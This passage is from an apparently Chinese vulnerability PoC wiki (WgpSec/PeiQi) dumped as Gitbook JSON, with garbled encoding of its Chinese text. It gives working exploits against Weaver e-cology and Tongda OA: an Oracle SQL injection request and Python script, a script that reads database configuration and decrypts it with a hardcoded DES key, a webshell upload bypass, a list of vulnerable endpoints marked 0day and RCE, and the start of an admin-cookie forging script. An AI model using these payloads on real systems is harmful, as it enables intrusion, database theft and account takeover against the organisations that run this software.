/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1 Host: ip:port Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ecology_JSessionId=abc49y8JvMcoqhSkCv02w; testBanCookie=test Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 æ¼æ´åˆ©ç”¨POC import requests import sys headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded' } def exploit(url): target=url+'/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333' payload=\"formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1\" res=requests.post(url=target,data=payload,headers=headers,timeout=10) res.encoding=res.apparent_encoding print(res.text) if __name__ == '__main__': url=sys.argv[1] exploit(url) å‚è€ƒæ–‡ç«  æ³›å¾®OA WorkflowCenterTreeDataæ¥å£æ³¨å…¥å¤ç°ï¼ˆä»…é™oracleæ•°æ®åº“ï¼‰ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA e-cology æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA e-cology æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´.html","title":"æ³›å¾®OA e-cology æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´","keywords":"","body":"æ³›å¾®OA e-cology æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´ æ¼æ´æè¿° 2019å¹´10æœˆ24æ—¥ï¼Œ360CERTç›‘æµ‹åˆ°å‹å•†å‘å¸ƒäº†æ³›å¾®e-cology OAæ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´é¢„è­¦ï¼Œæ¼æ´ç­‰çº§ä¸­ã€‚ æ”»å‡»è€…å¯é€šè¿‡å­˜åœ¨æ¼æ´çš„é¡µé¢ç›´æ¥è·å–åˆ°æ•°æ®åº“é…ç½®ä¿¡æ¯ã€‚å¦‚æœæ”»å‡»è€…å¯ç›´æ¥è®¿é—®æ•°æ®åº“ï¼Œåˆ™å¯ç›´æ¥è·å–ç”¨æˆ·æ•°æ®ï¼Œç”šè‡³å¯ä»¥ç›´æ¥æ§åˆ¶æ•°æ®åº“æœåŠ¡å™¨ã€‚ 360CERTåˆ¤æ–­æ¼æ´ç­‰çº§ä¸ºä¸­ï¼Œå±å®³é¢/å½±å“é¢ä½ã€‚å»ºè®®ä½¿ç”¨æ³›å¾®e-cology OAçš„ç”¨æˆ·åŠæ—¶å®‰è£…æœ€æ–°è¡¥ä¸ï¼Œä»¥å…é­å—é»‘å®¢æ”»å‡»ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] ç›®å‰å·²çŸ¥ä¸º8.100.0531,ä¸æ’é™¤å…¶ä»–ç‰ˆæœ¬ï¼ŒåŒ…æ‹¬ä¸é™äºEC7.0ã€EC8.0ã€EC9.0ç‰ˆ æ¼æ´å¤ç° æ ¹æ®æºç å¯ä»¥å¾—åˆ°DESå¯†é’¥ä¸º 1z2x3c4v5b6nï¼ˆä¹Ÿæœ‰1z2x3c4vçš„,å¯ä»¥æŒ‰æ­¤è§„å¾‹æ¥çˆ†ç ´ï¼‰ å¯ä»¥çœ‹åˆ°ä¼šå°†å½“å‰è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·åå¯†ç ï¼Œurlï¼Œlogintypeç­‰ä¿¡æ¯è¿›è¡ŒdesåŠ å¯†ï¼Œå¹¶æœ€ç»ˆè¿›è¡Œè¿”å›ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡desè§£å¯†è·å–æ³„éœ²ä¿¡æ¯ã€‚ æ¼æ´åˆ©ç”¨POC Githubé“¾æ¥ pythonä»£ç  import base64 import requests import ast def req(url): headers = { 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', } r1 = requests.get(url,headers=headers).content s = r1.replace('\\r\\n','') res1 = base64.b64encode(s) postdata = { 'data':res1, 'type':'des', 'arg':'m=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1' } u = 'http://tool.chacuo.net/cryptdes' r2 = requests.post(u,data=postdata,headers=headers).content res2 = ast.literal_eval(r2) return res2['data'] url = 'http://xxx.xxx.xxx.xxx:8888//mobile/DBconfigReader.jsp' print req(url) å‚è€ƒæ–‡ç«  [æ›´æ–°]æ³›å¾®e-cology OAæ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´é¢„è­¦ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA sysinterfacecodeEdit.jsp é¡µé¢ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA sysinterfacecodeEdit.jsp é¡µé¢ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"æ³›å¾®OA sysinterfacecodeEdit.jsp é¡µé¢ä»»æ„æ–‡ä»¶ä¸Šä¼ ","keywords":"","body":"æ³›å¾®OA sysinterface/codeEdit.jsp é¡µé¢ä»»æ„æ–‡ä»¶ä¸Šä¼  WooYun-2015-0155705 æ¼æ´æè¿° æ³›å¾®OA sysinterface/codeEdit.jsp é¡µé¢ä»»æ„æ–‡ä»¶ä¸Šä¼ å¯¼è‡´å¯ä»¥ä¸Šä¼ æ¶æ„æ–‡ä»¶ æ¼æ´æè¿° [!NOTE] è¾ƒè€ç‰ˆæœ¬ï¼Œç›®å‰æ— å‡†ç¡®ç‰ˆæœ¬ æ¼æ´å¤ç° filename=******5308.java&filetype=javafilenameä¸ºæ–‡ä»¶åç§° ä¸ºç©ºæ—¶ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ª String fileid = \"Ewv\"; String readonly = \"\"; boolean isCreate = false; if(StringHelper.isEmpty(fileName)) { Date ndate = new Date(); SimpleDateFormat sf = new SimpleDateFormat(\"yyyyMMddHHmmss\"); String datetime = sf.format(ndate); fileid = fileid + datetime; fileName= fileid + \".\" + filetype; isCreate = true; } else { int pointIndex = fileName.indexOf(\".\"); if(pointIndex > -1) { fileid = fileName.substring(0,pointIndex); }} å‚è€ƒæ–‡ç«  æ³›å¾®OAæœªæˆæƒå¯å¯¼è‡´GetShell WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/","title":"é€šè¾¾OA","keywords":"","body":"é€šè¾¾OA é€šè¾¾OAéƒ¨åˆ†æ¼æ´ä¿¡æ¯æ•´åˆ é€šè¾¾OA v11.2åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ é€šè¾¾OA v11.x-v11.5ä»»æ„ç”¨æˆ·ç™»å½• é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE é€šè¾¾OA v11.7åå°SQLæ³¨å…¥æ¼æ´ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OAéƒ¨åˆ†æ¼æ´ä¿¡æ¯æ•´åˆ.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OAéƒ¨åˆ†æ¼æ´ä¿¡æ¯æ•´åˆ.html","title":"é€šè¾¾OAéƒ¨åˆ†æ¼æ´ä¿¡æ¯æ•´åˆ","keywords":"","body":"é€šè¾¾OAéƒ¨åˆ†æ¼æ´ä¿¡æ¯æ•´åˆ é€šè¾¾OAä¿¡æ¯æ”¶é›† http[s]://TongDaOA.domain/inc/expired.php åˆ¤æ–­é€šè¾¾ç‰ˆæœ¬ http[s]://TongDaOA.domain/inc/reg_trial.php http[s]://TongDaOA.domain/inc/reg_trial_submit.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php GET å‚æ•°usernameã€email å¯çˆ†ç”¨æˆ·ã€é‚®ç®± http[s]://TongDaOA.domain/resque/worker.php è®¡ç®—æœºå 2013-2017(SQLi path) http[s]://TongDaOA.domain/module/crm2010/imageOperation/deleteImage.php http[s]://TongDaOA.domain/module/crm2010/product/type_tree.php http[s]://TongDaOA.domain/module/crm2010/select/getData.php http[s]://TongDaOA.domain/module/crm2010/select/getValue.php http[s]://TongDaOA.domain/module/crm2010/select/index.php http[s]://TongDaOA.domain/module/crm2010/share/update.php http[s]://TongDaOA.domain/portal/webportals/source/oa/news.php http[s]://TongDaOA.domain/portal/webportals/source/oa/notify.php?LOGIN_USER_ID= http[s]://TongDaOA.domain/task/crm/account_care_remind.php http[s]://TongDaOA.domain/task/crm/action_link_remind.php http[s]://TongDaOA.domain/task/crm/contract_birthday_remind.php http[s]://TongDaOA.domain/task/crm/contract_near_remind.php http[s]://TongDaOA.domain/task/crm/contract_remind.php http[s]://TongDaOA.domain/task/crm/crm_account_contact_bir_remind.php http[s]://TongDaOA.domain/task/crm/crm_complain_remind.php http[s]://TongDaOA.domain/task/crm/crm_opportunity_status_remind.php http[s]://TongDaOA.domain/task/crm/crm_salepay_remind.php http[s]://TongDaOA.domain/task/crm/crm_stockout_remind.php http[s]://TongDaOA.domain/task/crm/marketing_near_remind.php http[s]://TongDaOA.domain/task/crm/order_to_stockout_remind.php http[s]://TongDaOA.domain/task/crm/payment_near_remind.php http[s]://TongDaOA.domain/task/crm/storage_near_remind.php http[s]://TongDaOA.domain/ispirit/myoa.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php v11~v11.6 [0day] http[s]://TongDaOA.domain/general/approve_center/list/roll_config.inc.php http[s]://TongDaOA.domain/general/bi_design/reportshop/report_bi.func.php http[s]://TongDaOA.domain/general/data_center/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/design/report/action.php http[s]://TongDaOA.domain/general/reportshop/design/report/action.php http[s]://TongDaOA.domain/general/project/portal/details/budget/table.php http[s]://TongDaOA.domain/general/reportshop/design/report/console/autocode/autocode.php http[s]://TongDaOA.domain/general/reportshop/workshop/report/attachment-remark/form3.php http[s]://TongDaOA.domain/general/system/user/get_key_user_info.php http[s]://TongDaOA.domain/general/workflow/list/roll_config.inc.php http[s]://TongDaOA.domain/interface/GetNewAPP.php http[s]://TongDaOA.domain/interface/GetNewAPP1.php http[s]://TongDaOA.domain/general/workflow/plugin/turn/kd_k3_applly/kd_k3_applly.php http[s]://TongDaOA.domain/general/workflow/document_list/roll_config.inc.php v11.6 [RCE] http[s]://TongDaOA.domain/module/appbuilder/assets/print.php ä»»æ„æ–‡ä»¶åˆ é™¤ å‚è€ƒæ–‡ç«  é€šè¾¾OAæ¼æ´ä¸€äº›æ¼æ´ç‚¹(Github) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.2åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.2åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html","title":"é€šè¾¾OA v11.2åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","keywords":"","body":"é€šè¾¾OA v11.2åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ¼æ´æè¿° é€šè¾¾OA v11.2åå°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå…è®¸é€šè¿‡ç»•è¿‡é»‘åå•çš„æ–¹æ³•æ¥ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´æœåŠ¡å™¨è¢«æ”»å‡» å½±å“ç‰ˆæœ¬ [!NOTE] é€šè¾¾OA v11.2 ç¯å¢ƒæ­å»º é€šè¾¾OA v11.2ä¸‹è½½é“¾æ¥ ä¸‹è½½åæŒ‰æ­¥éª¤å®‰è£…å³å¯ æ¼æ´å¤ç° è¯¥æ¼æ´å­˜åœ¨äºåå°ï¼Œéœ€è¦é€šè¿‡ç™»å½•åæ‰èƒ½è¿›è¡Œä½¿ç”¨ ç™»å½•åç‚¹å‡» èœå• -> ç³»ç»Ÿç®¡ç† -> é™„ä»¶ç®¡ç† ç‚¹å‡»æ·»åŠ é™„å½•å­˜å‚¨ç®¡ç†æ·»åŠ å¦‚ä¸‹(å­˜å‚¨ç›®å½•ä¸º webroot ç›®å½•ï¼Œé»˜è®¤ä¸º D:/MYOA/webroot/) ç‚¹å‡» ç»„ç»‡ -> ç³»ç»Ÿç®¡ç†å‘˜ -> ä¸Šä¼ é™„ä»¶ æŠ“åŒ…ä½¿ç”¨ windows çš„ç»•è¿‡æ–¹æ³• shell.php -> shell.php. [!NOTE] 2012 ä¸ºç›®å½• 1717872192 ä¸ºæ‹¼æ¥çš„æ–‡ä»¶å æœ€åçš„shellåå­—ä¸º 1717872192.shell.php è®¿é—®æœ¨é©¬æ–‡ä»¶ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.x-v11.5ä»»æ„ç”¨æˆ·ç™»å½•.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.x-v11.5ä»»æ„ç”¨æˆ·ç™»å½•.html","title":"é€šè¾¾OA v11.x-v11.5ä»»æ„ç”¨æˆ·ç™»å½•","keywords":"","body":"é€šè¾¾OA v11.x-v11.5ä»»æ„ç”¨æˆ·ç™»å½• æ¼æ´æè¿° é€šè¾¾OAæ˜¯ä¸€å¥—åŠå…¬ç³»ç»Ÿã€‚2020å¹´04æœˆ17æ—¥, é€šè¾¾OAå®˜æ–¹åœ¨æ›´æ–°äº†ä¸€ä¸ªv11ç‰ˆæœ¬å®‰å…¨è¡¥ä¸, å…¶ä¸­ä¿®å¤äº†ä¸€ä¸ªä»»æ„ç”¨æˆ·ä¼ªé€ ç™»å½•æ¼æ´ã€‚ è¯¥æ¼æ´ç±»å‹ä¸ºä»»æ„ç”¨æˆ·ä¼ªé€ ï¼Œæœªç»æˆæƒçš„è¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚åŒ…è¿›è¡Œä»»æ„ç”¨æˆ·ä¼ªé€ ç™»å½•ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] é€šè¾¾OA 2017ç‰ˆ é€šè¾¾OAç‰ˆæœ¬ V11.X ç¯å¢ƒæ­å»º æ¼æ´ç¯å¢ƒä¸‹è½½ https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe åŒå‡»å®‰è£…å³å¯ æ¼æ´å¤ç° ä½¿ç”¨POCè·å–ç®¡ç†å‘˜çš„Cookie root@kali:~/æ¡Œé¢# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx [+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/ æˆåŠŸè·å¾—Cookie,æ·»åŠ Cookieè®¿é—® http://xxx.xxx.xxx.xxx/general/index.php?isIE=0&modify_pwd=0å³å¯ æ¼æ´åˆ©ç”¨POC ''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\", \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\", \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\", \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\", \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\", \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\", \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\", \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (compatible; 